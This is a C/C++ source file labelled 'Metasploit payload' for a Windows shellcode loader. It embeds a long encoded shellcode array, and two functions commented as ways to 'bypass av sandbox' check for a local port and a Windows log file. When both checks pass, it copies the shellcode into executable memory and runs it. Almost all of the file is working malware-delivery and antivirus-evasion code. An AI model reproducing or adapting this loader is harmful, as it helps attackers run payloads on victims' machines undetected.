/*
 *
 * Metasploit payload
 *
 * Developer:
 *  diodonfrost
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * LICENSE TERMS
 *
 * The free distribution and use of this software in both source and binary
 * form is allowed (with or without changes) provided that:
 *
 *   1. distributions of this source code include the above copyright
 *      notice, this list of conditions and the following disclaimer;
 *
 *   2. distributions in binary form include the above copyright
 *      notice, this list of conditions and the following disclaimer
 *      in the documentation and/or other associated materials;
 *
 *   3. the copyright holder's name is not used to endorse products
 *      built using this software without specific written permission.
 *
 * ALTERNATIVELY, provided that this notice is retained in full, this product
 * may be distributed under the terms of the GNU General Public License (GPL),
 * in which case the provisions of the GPL apply INSTEAD OF those given above.
 *
 * This software is provided 'as is' with no explicit or implied warranties
 * in respect of its properties, including, but not limited to, correctness
 * and/or fitness for purpose.
 */

#include <tchar.h>
#include <winsock2.h>
#include <fstream>
using namespace std;
#define MAX_LOADSTRING 100
#define PORT 445
#define SCSIZE 16256

// Bypass av sandbox by testing network
int test_socket() {
  WSADATA WSAData;
  WSAStartup(MAKEWORD(2, 2), &WSAData);
  SOCKET sock;
  SOCKADDR_IN sin;
  sock = socket(AF_INET, SOCK_STREAM, 0);

  // Configure network connexion
  sin.sin_addr.s_addr = inet_addr("127.0.0.1");
  sin.sin_family = AF_INET;
  sin.sin_port = htons(PORT);

  if (connect(sock, (SOCKADDR*)&sin, sizeof(sin)) != SOCKET_ERROR )
    return 1;
  else
    return 0;
}

// Bypass av sandbox by testing filesystem
int test_fichier() {
  ifstream megarabit("c:/windows/WindowsUpdate.log");

  if (megarabit)
    return 1;
  else
    return 0;
}

int APIENTRY _tWinMain(HINSTANCE hInstance,
  HINSTANCE hPrevInstance,
  LPTSTR lpCmLine,
  int nCmdShow ) {
    unsigned char *lpAlloc;
    lpAlloc = (unsigned char*)VirtualAlloc(0, SCSIZE,
                                              MEM_COMMIT,
                                              PAGE_EXECUTE_READWRITE);
      // Shellcode example, use msfvenom for generate your own shellcode
      unsigned char buf[SCSIZE] =
      "\xb8\xad\x5b\x93\x6a\xd9\xf7\xd9\x74\x24\xf4\x5a\x33\xc9\x66"
      "\xb9\x6a\x01\x83\xea\xfc\x31\x42\x10\x03\xef\x4b\x71\x9f\x55"
      "\xa3\xdf\x38\xd0\xef\xef\x60\x56\x34\x04\xcd\xbf\xfd\x82\x4b"
      "\xdd\xfc\x7b\xfb\x36\xfc\x2c\x14\xbb\xc5\xd7\xf8\x86\xb8\x5a"
      "\x3d\xb3\x22\xc1\x04\x29\x02\x94\x37\x7a\x15\xb2\x0f\xda\xc8"
      "\x1c\xab\x01\xce\xc9\xb1\x3d\x90\x4e\xcf\x57\x3b\xed\x2d\x73"
      "\xfb\x45\x73\x93\xf6\xe5\x71\x23\x4a\x72\x8f\x25\xfd\xe6\x18"
      "\x28\x35\xf8\xd0\x5e\x72\x25\xa6\x2d\x59\x74\xc9\x98\x68\x3e"
      "\x84\x17\xed\x06\x2a\xf4\x08\xa4\x40\x40\x77\xee\x83\xab\x62"
      "\x3f\xea\x64\x04\xda\xa0\x6f\x34\xbd\x33\x2b\x15\x3d\xa1\xa4"
      "\x02\x70\xe5\xe1\xfc\x5e\xd5\xa1\xad\xd1\xec\xc6\x63\xe8\x65"
      "\x0e\x3a\x64\x79\x4e\x9a\xa2\x9f\x61\xe7\x97\x42\xd7\x72\x07"
      "\x14\x71\x79\xce\x63\x5a\xce\x64\xae\x0f\x9c\xa1\xef\xfe\xc2"
      "\x11\x35\x7f\xef\x74\x6d\x1b\x42\xc0\xe3\x2e\xb3\xda\x6d\x1a"
      "\x3d\x4d\x45\x57\x28\xe8\x6e\x80\x68\x16\x5b\x82\xe4\x05\xaa"
      "\x10\x40\x32\x96\x3c\xb3\x81\xfc\x2c\xad\x5f\x8f\x0b\x43\x92"
      "\x19\xce\x52\x1b\x83\x0a\xec\xb2\x9a\x15\x6e\xb3\xfd\x23\x38"
      "\xc1\x7d\x11\x24\x6c\xd1\xfd\xdc\x55\x9f\x8f\x16\x77\x16\x1a"
      "\xc0\x2c\xb1\x22\x0b\x50\x10\xe8\xc7\xac\xab\x3c\xa8\x3d\x35"
      "\xf5\xcb\xa0\x96\x0c\xfe\x71\x6a\x6b\xb9\xf4\x3b\xb6\x4c\xd0"
      "\x80\xd2\x34\x1c\x12\xc4\x03\x67\x8c\x48\x5e\x0d\x3a\x16\xce"
      "\x5c\x2e\xdd\xa3\x30\xc0\x1e\x0d\x54\x66\x93\xbe\x93\xe9\xc4"
      "\x71\x1e\x99\xd8\x3e\x03\x20\xbd\xd2\xa3\x1d\x62\x59\xf8\x2d"
      "\x32\x9f\x77\x9e\x94\x7e\x2e\x73\x53\x65\x52\xc3\x91\xce\x92"
      "\x86\x77\x8f\x4b\x3c\xa6\x65\x53\x77\x87\xca\xb6\x4d\x93\xde"
      "\x4f\x75\x7e\x49\x04\xeb\xba\xf7\x6c\xe6\x3f\x3c\x4d\x2c\x2f"
      "\xdd\xd3\xb4\xfd\x24\x5b\x8b\x95\x76\x1e\x9b\xbd\xe1\x19\xd4"
      "\x80\xfb\x0c\x95\xcc\x61\x26\x3b\x3f\x68\xdf\xab\x43\xdc\x76"
      "\x70\x7b\x83\x66\x1c\x1d\xab\x95\x6f\x41\xc8\x24\xdd\xeb\xe6"
      "\xda\x05\x10\x12\x02\xe5\x36\x74\x6a\x01\xbb\xa0\xcf\x45\xba"
      "\x1c\xef\x9d\x4d\x8b\x5f\x28\xeb\x63\x6a\xb3\x26\xed\x52\x92"
      "\xab\x72\x31\xd5\x25\x84\x61\x9b\xb3\x65\xb3\x8a\x80\x5c\x31"
      "\x9e\x3a\x6e\x6a\x14\x38\x01\x83\xf5\x75\xee\xdb\x95\x16\x5b"
      "\x5d\x36\x38\xb5\xde\x40\x22\xe2\xd1\x74\xaf\x6e\x64\xf6\xf0"
      "\xe1\x1c\xc7\xfb\x4b\x79\xf4\x4a\x35\x19\x2d\x47\xf3\xba\x0f"
      "\x73\xd8\xa5\xa3\xf8\xd1\x56\x5f\x4e\xa4\x43\x47\xc4\x4b\xba"
      "\x3c\x7c\x49\x57\xa9\xa7\xea\x2b\x4e\xc8\x64\xd6\xe2\x46\x46"
      "\x32\x1e\xb1\x71\xff\x76\xfe\x6e\x3c\xaa\x87\xbf\x70\x3b\x6d"
      "\x6e\x5f\xfd\x56\x7e\xee\xcc\x40\xc5\xe1\xb2\x92\xe3\x62\x19"
      "\x41\x63\xe4\x24\xb4\xd7\xda\x18\x9b\xef\xde\xb5\xbb\x58\x37"
      "\x08\x67\x04\x29\x25\xaf\xf1\xb9\xb1\xf3\xe2\x54\xc6\xf5\x4b"
      "\x18\x35\xda\x13\xaf\x98\x10\xab\x86\x97\x78\xa0\x38\x82\xa4"
      "\x12\xc3\xf8\x29\xd1\x40\xdd\x62\x98\x8d\x84\x37\xe2\xb6\x7d"
      "\xd8\x11\xac\xd1\xab\x1c\x47\x66\x4f\xc9\x92\xcc\x40\xfc\xae"
      "\x67\x3a\xdf\x07\xbb\x5e\x2c\x4d\x7f\x34\x92\xd0\xf5\x29\x73"
      "\x9a\x33\x22\xbf\x3d\xad\x93\x4e\xe9\x8c\x80\x65\xdf\xa3\x4c"
      "\x73\x5b\xb4\x94\xf2\xa6\x54\x33\x18\x0d\x97\x02\xc2\x40\xe1"
      "\x26\xc4\x37\xd6\x58\x93\x80\xec\xfb\xa3\x0b\xa8\x6d\x6f\x3f"
      "\x74\xa5\xc5\xeb\x2f\x52\x9f\xc5\x4b\x54\xc2\xf8\x0f\x98\xa0"
      "\x56\x71\xd6\xf3\x83\x25\x50\x03\x53\x90\x88\x51\x46\xd9\x16"
      "\xa9\x20\x0a\x18\x9d\x75\x33\x58\x2a\xa7\x35\xe6\x9f\x04\xe4"
      "\x81\xea\x23\x46\xed\x19\x1f\xf3\xa9\xa8\x88\x1d\x95\x2a\xb1"
      "\x74\xea\x2e\x44\x1f\x51\x6a\x9f\xa3\x27\xa4\x8b\x57\xdf\x16"
      "\xf6\x88\x9d\xde\x4c\x39\x57\x3d\xe1\x7a\xd5\x94\xc0\x94\x93"
      "\x53\x0a\x6f\x31\x6a\x44\xbc\x54\xf6\x97\x15\x50\x7e\xa5\x58"
      "\x66\x2e\xa2\xc0\xbb\x34\x98\x56\x65\x3f\x87\xdc\x89\x42\x1a"
      "\x09\x24\x0a\x03\xa4\xd1\x8e\x6a\xd9\x6b\x4b\xd8\xfd\x1a\x97"
      "\x1a\xfb\x3a\x03\xf3\x81\xcc\x82\xd4\xcb\xdd\x8b\x9b\x67\x7b"
      "\x3e\xb2\xcf\xfe\x1f\xab\x69\x6f\x3b\x35\x1b\xcd\xc9\xd2\xc5"
      "\x33\x26\x72\x03\x11\xf1\x81\x23\xf0\x11\xc6\x2c\x6a\x59\x14"
      "\x32\x3e\xa8\x2c\xb3\x70\x01\xbc\x6d\x69\x8b\x57\x08\x3c\x2e"
      "\xc9\x43\xc7\xc0\x3f\x6c\xe3\x6e\xf1\x38\x33\xe6\x66\x7e\x0d"
      "\x5a\x7d\xa2\x90\x65\x0f\x32\x1b\x24\x1c\xdf\xbd\x77\x0e\x28"
      "\xa7\x36\x0d\xb3\x94\x01\x72\x1b\xec\xa6\xd1\xfc\x9f\x01\xd1"
      "\x2b\xf2\x75\x7b\x62\xfb\xed\x3c\xc1\xa5\x79\xb2\x83\x0f\x39"
      "\xcb\x96\x3b\xad\xc2\x3b\x05\x8e\xa2\x56\xef\xf2\x2a\x25\xcf"
      "\x0b\x9e\xeb\x61\x3c\xf5\xd5\x46\x64\xd1\x02\x54\x55\x28\x2a"
      "\xec\x64\x0a\x8f\xb4\xb7\x99\xee\xd9\xbe\xc5\xfc\xe7\xb4\x2c"
      "\x49\xd6\xf6\x0d\xaa\x37\x92\x50\x32\xb2\xf9\xcb\x15\x2f\x94"
      "\x1a\xc0\x28\x6d\xc5\x8a\xd5\xdf\x0c\x3d\x9a\xbc\x24\x13\x92"
      "\x6b\x92\x09\x04\xbd\xb9\x75\x7f\x51\xe5\x9c\x4a\x0a\x45\xd1"
      "\xe7\xfe\xf3\x37\xa8\x27\xca\xe1\x32\xc9\x08\xea\x32\x5b\xd0"
      "\xbb\xfe\x66\x29\xc2\x18\xb3\x0a\x2f\x8b\xe0\x88\x4a\x89\xe8"
      "\xe2\xa6\xfa\xf7\x06\xed\x63\xbe\xcc\xc5\x8b\x5a\xb0\xc2\x5e"
      "\x2b\x7e\x62\x86\xc6\xf0\x73\x61\xfc\x97\x80\x3e\xb2\x7f\x82"
      "\x27\x8a\x66\x0c\xdc\xa2\x62\xc4\x9f\x2e\xdb\xc8\x45\x46\xb5"
      "\xaa\x4b\x30\x12\x4d\xa1\xf1\xee\x5b\x18\xba\x44\x87\x11\x09"
      "\x1e\xf4\x28\x55\x81\x36\x88\x03\x80\x06\xc8\x7d\x66\xcb\x2b"
      "\x56\xbb\x94\x80\xb5\xa8\x69\x11\x09\x76\x9c\xa4\xfa\x42\xa1"
      "\x71\xeb\x94\x2e\xb3\x97\x22\x7c\x99\xf4\xb9\xd0\xb7\x86\x40"
      "\xa6\x1c\x94\x53\x20\xa8\x8e\x12\x14\x6a\x85\x56\xdb\x33\x59"
      "\xc4\xf2\x54\x84\x64\xf5\x9d\xf4\x5c\x62\x4a\xc7\x2b\x2f\x16"
      "\x4b\x79\x14\x42\x0d\x50\x49\xce\x20\x29\x35\xd6\x0b\x38\x0c"
      "\x69\x54\x57\x30\x3b\x58\xb7\x88\xe1\xde\xfb\xe9\x75\x95\x8e"
      "\xdb\x0e\xcc\x3f\xd7\x20\xfa\xe2\x13\x3b\x77\x4f\xce\xcb\x56"
      "\xd1\xc1\xec\x78\x46\x95\x73\xa7\x7f\xb5\x8d\x06\x8c\x02\xb6"
      "\x93\xa1\x2f\xad\xa0\x23\x02\x07\x97\x56\xbe\x22\xdb\xcd\x27"
      "\x8c\x52\x94\x7a\x6e\x0a\x97\x8d\xd8\xae\x13\x6b\xaf\x34\xa7"
      "\x13\x87\xfd\x88\x2e\x8f\x21\x45\x29\x9f\x1a\x45\x2f\x80\x6a"
      "\xa8\xb1\x1b\xed\x9d\x7f\x61\xea\xb7\xe4\x67\xab\xb7\xa6\xf9"
      "\x0e\x22\xfa\xfa\x1b\x52\x74\xee\xff\xa0\xfb\xcb\xd4\xca\x53"
      "\x68\x7d\x52\x53\x50\x60\xa0\x78\x0c\xb0\x40\xd0\x52\xf6\xde"
      "\xe8\x27\x8a\x93\x15\x69\xaa\x3b\x3e\x5d\x9f\xf3\xa4\x8f\xad"
      "\x49\x79\x79\xaa\x78\x5a\x63\x16\x4d\x3a\x4e\xbd\x88\x47\x46"
      "\x0f\xfb\xc8\xbb\xb7\x8d\x6b\xd3\x0a\xa7\x5e\x9c\x05\x46\xe4"
      "\x57\xd4\x0d\xba\x58\x27\x4a\x5d\x9c\xe1\x1f\x51\x35\xfe\xdd"
      "\x24\x9d\x29\x13\x6b\xca\x1a\x78\x8e\x99\x3c\x17\xd0\x0b\xed"
      "\xf1\xd5\xef\x1b\x92\x25\x5a\x75\x42\x1d\x7c\x10\x25\x24\xaa"
      "\x7d\x74\xb8";

  if (test_socket() && test_fichier()) {
    // Sleep(20000);
    memcpy(lpAlloc, buf, SCSIZE);
    // start payload
    (*(void (*) ()) (void*) lpAlloc)();
    }
    return 0;
}
